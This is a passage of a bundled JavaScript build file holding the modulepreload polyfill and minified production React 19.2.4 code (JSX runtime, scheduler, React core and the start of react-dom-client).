(function () {
  const H = document.createElement("link").relList;
  if (H && H.supports && H.supports("modulepreload")) return;
  for (const O of document.querySelectorAll('link[rel="modulepreload"]')) v(O);
  new MutationObserver((O) => {
    for (const V of O)
      if (V.type === "childList")
        for (const sl of V.addedNodes)
          sl.tagName === "LINK" && sl.rel === "modulepreload" && v(sl);
  }).observe(document, { childList: !0, subtree: !0 });
  function G(O) {
    const V = {};
    return (
      O.integrity && (V.integrity = O.integrity),
      O.referrerPolicy && (V.referrerPolicy = O.referrerPolicy),
      O.crossOrigin === "use-credentials"
        ? (V.credentials = "include")
        : O.crossOrigin === "anonymous"
        ? (V.credentials = "omit")
        : (V.credentials = "same-origin"),
      V
    );
  }
  function v(O) {
    if (O.ep) return;
    O.ep = !0;
    const V = G(O);
    fetch(O.href, V);
  }
})();
var nc = { exports: {} },
  bu = {};
/**
 * @license React
 * react-jsx-runtime.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var h0;
function $r() {
  if (h0) return bu;
  h0 = 1;
  var E = Symbol.for("react.transitional.element"),
    H = Symbol.for("react.fragment");
  function G(v, O, V) {
    var sl = null;
    if (
      (V !== void 0 && (sl = "" + V),
      O.key !== void 0 && (sl = "" + O.key),
      "key" in O)
    ) {
      V = {};
      for (var Ol in O) Ol !== "key" && (V[Ol] = O[Ol]);
    } else V = O;
    return (
      (O = V.ref),
      { $$typeof: E, type: v, key: sl, ref: O !== void 0 ? O : null, props: V }
    );
  }
  return (bu.Fragment = H), (bu.jsx = G), (bu.jsxs = G), bu;
}
var v0;
function Fr() {
  return v0 || ((v0 = 1), (nc.exports = $r())), nc.exports;
}
var s = Fr(),
  ic = { exports: {} },
  pu = {},
  fc = { exports: {} },
  cc = {};
/**
 * @license React
 * scheduler.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var m0;
function Ir() {
  return (
    m0 ||
      ((m0 = 1),
      (function (E) {
        function H(S, A) {
          var N = S.length;
          S.push(A);
          l: for (; 0 < N; ) {
            var nl = (N - 1) >>> 1,
              ol = S[nl];
            if (0 < O(ol, A)) (S[nl] = A), (S[N] = ol), (N = nl);
            else break l;
          }
        }
        function G(S) {
          return S.length === 0 ? null : S[0];
        }
        function v(S) {
          if (S.length === 0) return null;
          var A = S[0],
            N = S.pop();
          if (N !== A) {
            S[0] = N;
            l: for (var nl = 0, ol = S.length, d = ol >>> 1; nl < d; ) {
              var z = 2 * (nl + 1) - 1,
                j = S[z],
                _ = z + 1,
                X = S[_];
              if (0 > O(j, N))
                _ < ol && 0 > O(X, j)
                  ? ((S[nl] = X), (S[_] = N), (nl = _))
                  : ((S[nl] = j), (S[z] = N), (nl = z));
              else if (_ < ol && 0 > O(X, N)) (S[nl] = X), (S[_] = N), (nl = _);
              else break l;
            }
          }
          return A;
        }
        function O(S, A) {
          var N = S.sortIndex - A.sortIndex;
          return N !== 0 ? N : S.id - A.id;
        }
        if (
          ((E.unstable_now = void 0),
          typeof performance == "object" &&
            typeof performance.now == "function")
        ) {
          var V = performance;
          E.unstable_now = function () {
            return V.now();
          };
        } else {
          var sl = Date,
            Ol = sl.now();
          E.unstable_now = function () {
            return sl.now() - Ol;
          };
        }
        var D = [],
          T = [],
          I = 1,
          R = null,
          rl = 3,
          Ql = !1,
          Zl = !1,
          Cl = !1,
          Kl = !1,
          Hl = typeof setTimeout == "function" ? setTimeout : null,
          _t = typeof clearTimeout == "function" ? clearTimeout : null,
          Ml = typeof setImmediate < "u" ? setImmediate : null;
        function Rl(S) {
          for (var A = G(T); A !== null; ) {
            if (A.callback === null) v(T);
            else if (A.startTime <= S)
              v(T), (A.sortIndex = A.expirationTime), H(D, A);
            else break;
            A = G(T);
          }
        }
        function yt(S) {
          if (((Cl = !1), Rl(S), !Zl))
            if (G(D) !== null) (Zl = !0), Bl || ((Bl = !0), Q());
            else {
              var A = G(T);
              A !== null && kl(yt, A.startTime - S);
            }
        }
        var Bl = !1,
          K = -1,
          Nl = 5,
          ht = -1;
        function Ft() {
          return Kl ? !0 : !(E.unstable_now() - ht < Nl);
        }
        function q() {
          if (((Kl = !1), Bl)) {
            var S = E.unstable_now();
            ht = S;
            var A = !0;
            try {
              l: {
                (Zl = !1), Cl && ((Cl = !1), _t(K), (K = -1)), (Ql = !0);
                var N = rl;
                try {
                  t: {
                    for (
                      Rl(S), R = G(D);
                      R !== null && !(R.expirationTime > S && Ft());

                    ) {
                      var nl = R.callback;
                      if (typeof nl == "function") {
                        (R.callback = null), (rl = R.priorityLevel);
                        var ol = nl(R.expirationTime <= S);
                        if (((S = E.unstable_now()), typeof ol == "function")) {
                          (R.callback = ol), Rl(S), (A = !0);
                          break t;
                        }
                        R === G(D) && v(D), Rl(S);
                      } else v(D);
                      R = G(D);
                    }
                    if (R !== null) A = !0;
                    else {
                      var d = G(T);
                      d !== null && kl(yt, d.startTime - S), (A = !1);
                    }
                  }
                  break l;
                } finally {
                  (R = null), (rl = N), (Ql = !1);
                }
                A = void 0;
              }
            } finally {
              A ? Q() : (Bl = !1);
            }
          }
        }
        var Q;
        if (typeof Ml == "function")
          Q = function () {
            Ml(q);
          };
        else if (typeof MessageChannel < "u") {
          var ml = new MessageChannel(),
            Jl = ml.port2;
          (ml.port1.onmessage = q),
            (Q = function () {
              Jl.postMessage(null);
            });
        } else
          Q = function () {
            Hl(q, 0);
          };
        function kl(S, A) {
          K = Hl(function () {
            S(E.unstable_now());
          }, A);
        }
        (E.unstable_IdlePriority = 5),
          (E.unstable_ImmediatePriority = 1),
          (E.unstable_LowPriority = 4),
          (E.unstable_NormalPriority = 3),
          (E.unstable_Profiling = null),
          (E.unstable_UserBlockingPriority = 2),
          (E.unstable_cancelCallback = function (S) {
            S.callback = null;
          }),
          (E.unstable_forceFrameRate = function (S) {
            0 > S || 125 < S
              ? console.error(
                  "forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"
                )
              : (Nl = 0 < S ? Math.floor(1e3 / S) : 5);
          }),
          (E.unstable_getCurrentPriorityLevel = function () {
            return rl;
          }),
          (E.unstable_next = function (S) {
            switch (rl) {
              case 1:
              case 2:
              case 3:
                var A = 3;
                break;
              default:
                A = rl;
            }
            var N = rl;
            rl = A;
            try {
              return S();
            } finally {
              rl = N;
            }
          }),
          (E.unstable_requestPaint = function () {
            Kl = !0;
          }),
          (E.unstable_runWithPriority = function (S, A) {
            switch (S) {
              case 1:
              case 2:
              case 3:
              case 4:
              case 5:
                break;
              default:
                S = 3;
            }
            var N = rl;
            rl = S;
            try {
              return A();
            } finally {
              rl = N;
            }
          }),
          (E.unstable_scheduleCallback = function (S, A, N) {
            var nl = E.unstable_now();
            switch (
              (typeof N == "object" && N !== null
                ? ((N = N.delay),
                  (N = typeof N == "number" && 0 < N ? nl + N : nl))
                : (N = nl),
              S)
            ) {
              case 1:
                var ol = -1;
                break;
              case 2:
                ol = 250;
                break;
              case 5:
                ol = 1073741823;
                break;
              case 4:
                ol = 1e4;
                break;
              default:
                ol = 5e3;
            }
            return (
              (ol = N + ol),
              (S = {
                id: I++,
                callback: A,
                priorityLevel: S,
                startTime: N,
                expirationTime: ol,
                sortIndex: -1,
              }),
              N > nl
                ? ((S.sortIndex = N),
                  H(T, S),
                  G(D) === null &&
                    S === G(T) &&
                    (Cl ? (_t(K), (K = -1)) : (Cl = !0), kl(yt, N - nl)))
                : ((S.sortIndex = ol),
                  H(D, S),
                  Zl || Ql || ((Zl = !0), Bl || ((Bl = !0), Q()))),
              S
            );
          }),
          (E.unstable_shouldYield = Ft),
          (E.unstable_wrapCallback = function (S) {
            var A = rl;
            return function () {
              var N = rl;
              rl = A;
              try {
                return S.apply(this, arguments);
              } finally {
                rl = N;
              }
            };
          });
      })(cc)),
    cc
  );
}
var g0;
function Pr() {
  return g0 || ((g0 = 1), (fc.exports = Ir())), fc.exports;
}
var sc = { exports: {} },
  Y = {};
/**
 * @license React
 * react.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var S0;
function ly() {
  if (S0) return Y;
  S0 = 1;
  var E = Symbol.for("react.transitional.element"),
    H = Symbol.for("react.portal"),
    G = Symbol.for("react.fragment"),
    v = Symbol.for("react.strict_mode"),
    O = Symbol.for("react.profiler"),
    V = Symbol.for("react.consumer"),
    sl = Symbol.for("react.context"),
    Ol = Symbol.for("react.forward_ref"),
    D = Symbol.for("react.suspense"),
    T = Symbol.for("react.memo"),
    I = Symbol.for("react.lazy"),
    R = Symbol.for("react.activity"),
    rl = Symbol.iterator;
  function Ql(d) {
    return d === null || typeof d != "object"
      ? null
      : ((d = (rl && d[rl]) || d["@@iterator"]),
        typeof d == "function" ? d : null);
  }
  var Zl = {
      isMounted: function () {
        return !1;
      },
      enqueueForceUpdate: function () {},
      enqueueReplaceState: function () {},
      enqueueSetState: function () {},
    },
    Cl = Object.assign,
    Kl = {};
  function Hl(d, z, j) {
    (this.props = d),
      (this.context = z),
      (this.refs = Kl),
      (this.updater = j || Zl);
  }
  (Hl.prototype.isReactComponent = {}),
    (Hl.prototype.setState = function (d, z) {
      if (typeof d != "object" && typeof d != "function" && d != null)
        throw Error(
          "takes an object of state variables to update or a function which returns an object of state variables."
        );
      this.updater.enqueueSetState(this, d, z, "setState");
    }),
    (Hl.prototype.forceUpdate = function (d) {
      this.updater.enqueueForceUpdate(this, d, "forceUpdate");
    });
  function _t() {}
  _t.prototype = Hl.prototype;
  function Ml(d, z, j) {
    (this.props = d),
      (this.context = z),
      (this.refs = Kl),
      (this.updater = j || Zl);
  }
  var Rl = (Ml.prototype = new _t());
  (Rl.constructor = Ml), Cl(Rl, Hl.prototype), (Rl.isPureReactComponent = !0);
  var yt = Array.isArray;
  function Bl() {}
  var K = { H: null, A: null, T: null, S: null },
    Nl = Object.prototype.hasOwnProperty;
  function ht(d, z, j) {
    var _ = j.ref;
    return {
      $$typeof: E,
      type: d,
      key: z,
      ref: _ !== void 0 ? _ : null,
      props: j,
    };
  }
  function Ft(d, z) {
    return ht(d.type, z, d.props);
  }
  function q(d) {
    return typeof d == "object" && d !== null && d.$$typeof === E;
  }
  function Q(d) {
    var z = { "=": "=0", ":": "=2" };
    return (
      "$" +
      d.replace(/[=:]/g, function (j) {
        return z[j];
      })
    );
  }
  var ml = /\/+/g;
  function Jl(d, z) {
    return typeof d == "object" && d !== null && d.key != null
      ? Q("" + d.key)
      : z.toString(36);
  }
  function kl(d) {
    switch (d.status) {
      case "fulfilled":
        return d.value;
      case "rejected":
        throw d.reason;
      default:
        switch (
          (typeof d.status == "string"
            ? d.then(Bl, Bl)
            : ((d.status = "pending"),
              d.then(
                function (z) {
                  d.status === "pending" &&
                    ((d.status = "fulfilled"), (d.value = z));
                },
                function (z) {
                  d.status === "pending" &&
                    ((d.status = "rejected"), (d.reason = z));
                }
              )),
          d.status)
        ) {
          case "fulfilled":
            return d.value;
          case "rejected":
            throw d.reason;
        }
    }
    throw d;
  }
  function S(d, z, j, _, X) {
    var J = typeof d;
    (J === "undefined" || J === "boolean") && (d = null);
    var el = !1;
    if (d === null) el = !0;
    else
      switch (J) {
        case "bigint":
        case "string":
        case "number":
          el = !0;
          break;
        case "object":
          switch (d.$$typeof) {
            case E:
            case H:
              el = !0;
              break;
            case I:
              return (el = d._init), S(el(d._payload), z, j, _, X);
          }
      }
    if (el)
      return (
        (X = X(d)),
        (el = _ === "" ? "." + Jl(d, 0) : _),
        yt(X)
          ? ((j = ""),
            el != null && (j = el.replace(ml, "$&/") + "/"),
            S(X, z, j, "", function (ja) {
              return ja;
            }))
          : X != null &&
            (q(X) &&
              (X = Ft(
                X,
                j +
                  (X.key == null || (d && d.key === X.key)
                    ? ""
                    : ("" + X.key).replace(ml, "$&/") + "/") +
                  el
              )),
            z.push(X)),
        1
      );
    el = 0;
    var wl = _ === "" ? "." : _ + ":";
    if (yt(d))
      for (var pl = 0; pl < d.length; pl++)
        (_ = d[pl]), (J = wl + Jl(_, pl)), (el += S(_, z, j, J, X));
    else if (((pl = Ql(d)), typeof pl == "function"))
      for (d = pl.call(d), pl = 0; !(_ = d.next()).done; )
        (_ = _.value), (J = wl + Jl(_, pl++)), (el += S(_, z, j, J, X));
    else if (J === "object") {
      if (typeof d.then == "function") return S(kl(d), z, j, _, X);
      throw (
        ((z = String(d)),
        Error(
          "Objects are not valid as a React child (found: " +
            (z === "[object Object]"
              ? "object with keys {" + Object.keys(d).join(", ") + "}"
              : z) +
            "). If you meant to render a collection of children, use an array instead."
        ))
      );
    }
    return el;
  }
  function A(d, z, j) {
    if (d == null) return d;
    var _ = [],
      X = 0;
    return (
      S(d, _, "", "", function (J) {
        return z.call(j, J, X++);
      }),
      _
    );
  }
  function N(d) {
    if (d._status === -1) {
      var z = d._result;
      (z = z()),
        z.then(
          function (j) {
            (d._status === 0 || d._status === -1) &&
              ((d._status = 1), (d._result = j));
          },
          function (j) {
            (d._status === 0 || d._status === -1) &&
              ((d._status = 2), (d._result = j));
          }
        ),
        d._status === -1 && ((d._status = 0), (d._result = z));
    }
    if (d._status === 1) return d._result.default;
    throw d._result;
  }
  var nl =
      typeof reportError == "function"
        ? reportError
        : function (d) {
            if (
              typeof window == "object" &&
              typeof window.ErrorEvent == "function"
            ) {
              var z = new window.ErrorEvent("error", {
                bubbles: !0,
                cancelable: !0,
                message:
                  typeof d == "object" &&
                  d !== null &&
                  typeof d.message == "string"
                    ? String(d.message)
                    : String(d),
                error: d,
              });
              if (!window.dispatchEvent(z)) return;
            } else if (
              typeof process == "object" &&
              typeof process.emit == "function"
            ) {
              process.emit("uncaughtException", d);
              return;
            }
            console.error(d);
          },
    ol = {
      map: A,
      forEach: function (d, z, j) {
        A(
          d,
          function () {
            z.apply(this, arguments);
          },
          j
        );
      },
      count: function (d) {
        var z = 0;
        return (
          A(d, function () {
            z++;
          }),
          z
        );
      },
      toArray: function (d) {
        return (
          A(d, function (z) {
            return z;
          }) || []
        );
      },
      only: function (d) {
        if (!q(d))
          throw Error(
            "React.Children.only expected to receive a single React element child."
          );
        return d;
      },
    };
  return (
    (Y.Activity = R),
    (Y.Children = ol),
    (Y.Component = Hl),
    (Y.Fragment = G),
    (Y.Profiler = O),
    (Y.PureComponent = Ml),
    (Y.StrictMode = v),
    (Y.Suspense = D),
    (Y.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = K),
    (Y.__COMPILER_RUNTIME = {
      __proto__: null,
      c: function (d) {
        return K.H.useMemoCache(d);
      },
    }),
    (Y.cache = function (d) {
      return function () {
        return d.apply(null, arguments);
      };
    }),
    (Y.cacheSignal = function () {
      return null;
    }),
    (Y.cloneElement = function (d, z, j) {
      if (d == null)
        throw Error(
          "The argument must be a React element, but you passed " + d + "."
        );
      var _ = Cl({}, d.props),
        X = d.key;
      if (z != null)
        for (J in (z.key !== void 0 && (X = "" + z.key), z))
          !Nl.call(z, J) ||
            J === "key" ||
            J === "__self" ||
            J === "__source" ||
            (J === "ref" && z.ref === void 0) ||
            (_[J] = z[J]);
      var J = arguments.length - 2;
      if (J === 1) _.children = j;
      else if (1 < J) {
        for (var el = Array(J), wl = 0; wl < J; wl++)
          el[wl] = arguments[wl + 2];
        _.children = el;
      }
      return ht(d.type, X, _);
    }),
    (Y.createContext = function (d) {
      return (
        (d = {
          $$typeof: sl,
          _currentValue: d,
          _currentValue2: d,
          _threadCount: 0,
          Provider: null,
          Consumer: null,
        }),
        (d.Provider = d),
        (d.Consumer = { $$typeof: V, _context: d }),
        d
      );
    }),
    (Y.createElement = function (d, z, j) {
      var _,
        X = {},
        J = null;
      if (z != null)
        for (_ in (z.key !== void 0 && (J = "" + z.key), z))
          Nl.call(z, _) &&
            _ !== "key" &&
            _ !== "__self" &&
            _ !== "__source" &&
            (X[_] = z[_]);
      var el = arguments.length - 2;
      if (el === 1) X.children = j;
      else if (1 < el) {
        for (var wl = Array(el), pl = 0; pl < el; pl++)
          wl[pl] = arguments[pl + 2];
        X.children = wl;
      }
      if (d && d.defaultProps)
        for (_ in ((el = d.defaultProps), el))
          X[_] === void 0 && (X[_] = el[_]);
      return ht(d, J, X);
    }),
    (Y.createRef = function () {
      return { current: null };
    }),
    (Y.forwardRef = function (d) {
      return { $$typeof: Ol, render: d };
    }),
    (Y.isValidElement = q),
    (Y.lazy = function (d) {
      return { $$typeof: I, _payload: { _status: -1, _result: d }, _init: N };
    }),
    (Y.memo = function (d, z) {
      return { $$typeof: T, type: d, compare: z === void 0 ? null : z };
    }),
    (Y.startTransition = function (d) {
      var z = K.T,
        j = {};
      K.T = j;
      try {
        var _ = d(),
          X = K.S;
        X !== null && X(j, _),
          typeof _ == "object" &&
            _ !== null &&
            typeof _.then == "function" &&
            _.then(Bl, nl);
      } catch (J) {
        nl(J);
      } finally {
        z !== null && j.types !== null && (z.types = j.types), (K.T = z);
      }
    }),
    (Y.unstable_useCacheRefresh = function () {
      return K.H.useCacheRefresh();
    }),
    (Y.use = function (d) {
      return K.H.use(d);
    }),
    (Y.useActionState = function (d, z, j) {
      return K.H.useActionState(d, z, j);
    }),
    (Y.useCallback = function (d, z) {
      return K.H.useCallback(d, z);
    }),
    (Y.useContext = function (d) {
      return K.H.useContext(d);
    }),
    (Y.useDebugValue = function () {}),
    (Y.useDeferredValue = function (d, z) {
      return K.H.useDeferredValue(d, z);
    }),
    (Y.useEffect = function (d, z) {
      return K.H.useEffect(d, z);
    }),
    (Y.useEffectEvent = function (d) {
      return K.H.useEffectEvent(d);
    }),
    (Y.useId = function () {
      return K.H.useId();
    }),
    (Y.useImperativeHandle = function (d, z, j) {
      return K.H.useImperativeHandle(d, z, j);
    }),
    (Y.useInsertionEffect = function (d, z) {
      return K.H.useInsertionEffect(d, z);
    }),
    (Y.useLayoutEffect = function (d, z) {
      return K.H.useLayoutEffect(d, z);
    }),
    (Y.useMemo = function (d, z) {
      return K.H.useMemo(d, z);
    }),
    (Y.useOptimistic = function (d, z) {
      return K.H.useOptimistic(d, z);
    }),
    (Y.useReducer = function (d, z, j) {
      return K.H.useReducer(d, z, j);
    }),
    (Y.useRef = function (d) {
      return K.H.useRef(d);
    }),
    (Y.useState = function (d) {
      return K.H.useState(d);
    }),
    (Y.useSyncExternalStore = function (d, z, j) {
      return K.H.useSyncExternalStore(d, z, j);
    }),
    (Y.useTransition = function () {
      return K.H.useTransition();
    }),
    (Y.version = "19.2.4"),
    Y
  );
}
var b0;
function dc() {
  return b0 || ((b0 = 1), (sc.exports = ly())), sc.exports;
}
var oc = { exports: {} },
  Vl = {};
/**
 * @license React
 * react-dom.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var p0;
function ty() {
  if (p0) return Vl;
  p0 = 1;
  var E = dc();
  function H(D) {
    var T = "https://react.dev/errors/" + D;
    if (1 < arguments.length) {
      T += "?args[]=" + encodeURIComponent(arguments[1]);
      for (var I = 2; I < arguments.length; I++)
        T += "&args[]=" + encodeURIComponent(arguments[I]);
    }
    return (
      "Minified React error #" +
      D +
      "; visit " +
      T +
      " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
    );
  }
  function G() {}
  var v = {
      d: {
        f: G,
        r: function () {
          throw Error(H(522));
        },
        D: G,
        C: G,
        L: G,
        m: G,
        X: G,
        S: G,
        M: G,
      },
      p: 0,
      findDOMNode: null,
    },
    O = Symbol.for("react.portal");
  function V(D, T, I) {
    var R =
      3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
    return {
      $$typeof: O,
      key: R == null ? null : "" + R,
      children: D,
      containerInfo: T,
      implementation: I,
    };
  }
  var sl = E.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;
  function Ol(D, T) {
    if (D === "font") return "";
    if (typeof T == "string") return T === "use-credentials" ? T : "";
  }
  return (
    (Vl.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = v),
    (Vl.createPortal = function (D, T) {
      var I =
        2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
      if (!T || (T.nodeType !== 1 && T.nodeType !== 9 && T.nodeType !== 11))
        throw Error(H(299));
      return V(D, T, null, I);
    }),
    (Vl.flushSync = function (D) {
      var T = sl.T,
        I = v.p;
      try {
        if (((sl.T = null), (v.p = 2), D)) return D();
      } finally {
        (sl.T = T), (v.p = I), v.d.f();
      }
    }),
    (Vl.preconnect = function (D, T) {
      typeof D == "string" &&
        (T
          ? ((T = T.crossOrigin),
            (T =
              typeof T == "string"
                ? T === "use-credentials"
                  ? T
                  : ""
                : void 0))
          : (T = null),
        v.d.C(D, T));
    }),
    (Vl.prefetchDNS = function (D) {
      typeof D == "string" && v.d.D(D);
    }),
    (Vl.preinit = function (D, T) {
      if (typeof D == "string" && T && typeof T.as == "string") {
        var I = T.as,
          R = Ol(I, T.crossOrigin),
          rl = typeof T.integrity == "string" ? T.integrity : void 0,
          Ql = typeof T.fetchPriority == "string" ? T.fetchPriority : void 0;
        I === "style"
          ? v.d.S(D, typeof T.precedence == "string" ? T.precedence : void 0, {
              crossOrigin: R,
              integrity: rl,
              fetchPriority: Ql,
            })
          : I === "script" &&
            v.d.X(D, {
              crossOrigin: R,
              integrity: rl,
              fetchPriority: Ql,
              nonce: typeof T.nonce == "string" ? T.nonce : void 0,
            });
      }
    }),
    (Vl.preinitModule = function (D, T) {
      if (typeof D == "string")
        if (typeof T == "object" && T !== null) {
          if (T.as == null || T.as === "script") {
            var I = Ol(T.as, T.crossOrigin);
            v.d.M(D, {
              crossOrigin: I,
              integrity: typeof T.integrity == "string" ? T.integrity : void 0,
              nonce: typeof T.nonce == "string" ? T.nonce : void 0,
            });
          }
        } else T == null && v.d.M(D);
    }),
    (Vl.preload = function (D, T) {
      if (
        typeof D == "string" &&
        typeof T == "object" &&
        T !== null &&
        typeof T.as == "string"
      ) {
        var I = T.as,
          R = Ol(I, T.crossOrigin);
        v.d.L(D, I, {
          crossOrigin: R,
          integrity: typeof T.integrity == "string" ? T.integrity : void 0,
          nonce: typeof T.nonce == "string" ? T.nonce : void 0,
          type: typeof T.type == "string" ? T.type : void 0,
          fetchPriority:
            typeof T.fetchPriority == "string" ? T.fetchPriority : void 0,
          referrerPolicy:
            typeof T.referrerPolicy == "string" ? T.referrerPolicy : void 0,
          imageSrcSet:
            typeof T.imageSrcSet == "string" ? T.imageSrcSet : void 0,
          imageSizes: typeof T.imageSizes == "string" ? T.imageSizes : void 0,
          media: typeof T.media == "string" ? T.media : void 0,
        });
      }
    }),
    (Vl.preloadModule = function (D, T) {
      if (typeof D == "string")
        if (T) {
          var I = Ol(T.as, T.crossOrigin);
          v.d.m(D, {
            as: typeof T.as == "string" && T.as !== "script" ? T.as : void 0,
            crossOrigin: I,
            integrity: typeof T.integrity == "string" ? T.integrity : void 0,
          });
        } else v.d.m(D);
    }),
    (Vl.requestFormReset = function (D) {
      v.d.r(D);
    }),
    (Vl.unstable_batchedUpdates = function (D, T) {
      return D(T);
    }),
    (Vl.useFormState = function (D, T, I) {
      return sl.H.useFormState(D, T, I);
    }),
    (Vl.useFormStatus = function () {
      return sl.H.useHostTransitionStatus();
    }),
    (Vl.version = "19.2.4"),
    Vl
  );
}
var x0;
function ey() {
  if (x0) return oc.exports;
  x0 = 1;
  function E() {
    if (
      !(
        typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" ||
        typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"
      )
    )
      try {
        __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(E);
      } catch (H) {
        console.error(H);
      }
  }
  return E(), (oc.exports = ty()), oc.exports;
}
/**
 * @license React
 * react-dom-client.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var z0;
function ay() {
  if (z0) return pu;
  z0 = 1;
  var E = Pr(),
    H = dc(),
    G = ey();
  function v(l) {
    var t = "https://react.dev/errors/" + l;
    if (1 < arguments.length) {
      t += "?args[]=" + encodeURIComponent(arguments[1]);
      for (var e = 2; e < arguments.length; e++)
        t += "&args[]=" + encodeURIComponent(arguments[e]);
    }
    return (
      "Minified React error #" +
      l +
      "; visit " +
      t +
      " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
    );
  }
  function O(l) {
    return !(!l || (l.nodeType !== 1 && l.nodeType !== 9 && l.nodeType !== 11));
  }
  function V(l) {
    var t = l,
      e = l;
    if (l.alternate) for (; t.return; ) t = t.return;
    else {
      l = t;
      do (t = l), (t.flags & 4098) !== 0 && (e = t.return), (l = t.return);
      while (l);
    }
    return t.tag === 3 ? e : null;
  }
  function sl(l) {
    if (l.tag === 13) {
      var t = l.memoizedState;
      if (
        (t === null && ((l = l.alternate), l !== null && (t = l.memoizedState)),
        t !== null)
      )
        return t.dehydrated;
    }
    return null;
  }
  function Ol(l) {
    if (l.tag === 31) {
      var t = l.memoizedState;
      if (
        (t === null && ((l = l.alternate), l !== null && (t = l.memoizedState)),
        t !== null)
      )
        return t.dehydrated;
    }
    return null;
  }
  function D(l) {
    if (V(l) !== l) throw Error(v(188));
  }
  function T(l) {
    var t = l.alternate;
    if (!t) {
      if (((t = V(l)), t === null)) throw Error(v(188));
      return t !== l ? null : l;
    }
    for (var e = l, a = t; ; ) {
      var u = e.return;
      if (u === null) break;
      var n = u.alternate;
      if (n === null) {
        if (((a = u.return), a !== null)) {
          e = a;
          continue;
        }
        break;
      }
      if (u.child === n.child) {
        for (n = u.child; n; ) {
          if (n === e) return D(u), l;
          if (n === a) return D(u), t;
          n = n.sibling;
        }
        throw Error(v(188));
      }
      if (e.return !== a.return) (e = u), (a = n);
      else {
        for (var i = !1, f = u.child; f; ) {
          if (f === e) {
            (i = !0), (e = u), (a = n);
            break;
          }
          if (f === a) {
            (i = !0), (a = u), (e = n);
            break;
          }
          f = f.sibling;
        }
        if (!i) {
          for (f = n.child; f; ) {
            if (f === e) {
              (i = !0), (e = n), (a = u);
              break;
            }
            if (f === a) {
              (i = !0), (a = n), (e = u);
              break;
            }
            f = f.sibling;
          }
          if (!i) throw Error(v(189));
        }
      }
      if (e.alternate !== a) throw Error(v(190));
    }
    if (e.tag !== 3) throw Error(v(188));
    return e.stateNode.current === e ? l : t;
  }
  function I(l) {
    var t = l.tag;
    if (t === 5 || t === 26 || t === 27 || t === 6) return l;
    for (l = l.child; l !== null; ) {
      if (((t = I(l)), t !== null)) return t;
      l = l.sibling;
    }
    return null;
  }
  var R = Object.assign,
    rl = Symbol.for("react.element"),
    Ql = Symbol.for("react.transitional.element"),
    Zl = Symbol.for("react.portal"),
    Cl = Symbol.for("react.fragment"),
    Kl = Symbol.for("react.strict_mode"),
    Hl = Symbol.for("react.profiler"),
    _t = Symbol.for("react.consumer"),
    Ml = Symbol.for("react.context"),
    Rl = Symbol.for("react.forward_ref"),
    yt = Symbol.for("react.suspense"),
    Bl = Symbol.for("react.suspense_list"),
    K = Symbol.for("react.memo"),
    Nl = Symbol.for("react.lazy"),
    ht = Symbol.for("react.activity"),
    Ft = Symbol.for("react.memo_cache_sentinel"),
    q = Symbol.iterator;
  function Q(l) {
    return l === null || typeof l != "object"
      ? null
      : ((l = (q && l[q]) || l["@@iterator"]),
        typeof l == "function" ? l : null);
  }
  var ml = Symbol.for("react.client.reference");
  function Jl(l) {
    if (l == null) return null;
    if (typeof l == "function")
      return l.$$typeof === ml ? null : l.displayName || l.name || null;
    if (typeof l == "string") return l;
    switch (l) {
      case Cl:
        return "Fragment";
      case Hl:
        return "Profiler";
      case Kl:
        return "StrictMode";
      case yt:
        return "Suspense";
      case Bl:
        return "SuspenseList";
      case ht:
        return "Activity";
    }
    if (typeof l == "object")
      switch (l.$$typeof) {
        case Zl:
          return "Portal";
        case Ml:
          return l.displayName || "Context";
        case _t:
          return (l._context.displayName || "Context") + ".Consumer";
        case Rl:
          var t = l.render;
          return (
            (l = l.displayName),
            l ||
              ((l = t.displayName || t.name || ""),
              (l = l !== "" ? "ForwardRef(" + l + ")" : "ForwardRef")),
            l
          );
        case K:
          return (
            (t = l.displayName || null), t !== null ? t : Jl(l.type) || "Memo"
          );
        case Nl:
          (t = l._payload), (l = l._init);
          try {
            return Jl(l(t));
          } catch {}
      }
    return null;
  }
  var kl = Array.isArray,
    S = H.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,
    A = G.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,
    N = { pending: !1, data: null, method: null, action: null },
    nl = [],
    ol = -1;
  function d(l) {
    return { current: l };
  }
  function z(l) {
    0 > ol || ((l.current = nl[ol]), (nl[ol] = null), ol--);
  }
  function j(l, t) {
    ol++, (nl[ol] = l.current), (l.current = t);
  }
  var _ = d(null),
    X = d(null),
    J = d(null),
    el = d(null);
  function wl(l, t) {
    switch ((j(J, t), j(X, l), j(_, null), t.nodeType)) {
      case 9:
      case 11:
        l = (l = t.documentElement) && (l = l.namespaceURI) ? qd(l) : 0;
        break;
      default:
        if (((l = t.tagName), (t = t.namespaceURI)))
          (t = qd(t)), (l = Yd(t, l));
        else
          switch (l) {
            case "svg":
              l = 1;
              break;
            case "math":
              l = 2;
              break;
            default:
              l = 0;
          }
    }
    z(_), j(_, l);
  }
  function pl() {
    z(_), z(X), z(J);
  }
